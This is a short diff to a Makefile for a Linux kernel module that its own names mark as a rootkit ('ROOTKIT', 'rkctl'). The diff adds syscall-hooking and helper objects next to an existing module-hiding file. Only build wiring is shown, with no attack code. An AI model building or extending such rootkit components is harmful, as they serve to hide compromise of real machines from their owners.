@@ -6,7 +6,9 @@ all: rkctl tlskit
 obj-m += $(ROOTKIT).o
 
 tlskit-objs += 	$(SRC_DIR)/lkm.o \
-				$(SRC_DIR)/module_hiding.o
+				$(SRC_DIR)/module_hiding.o \
+				$(SRC_DIR)/helper.o \
+				$(SRC_DIR)/syscall_hooking.o
 
 tlskit:
 	echo "Compiling lkm tlskit ..."
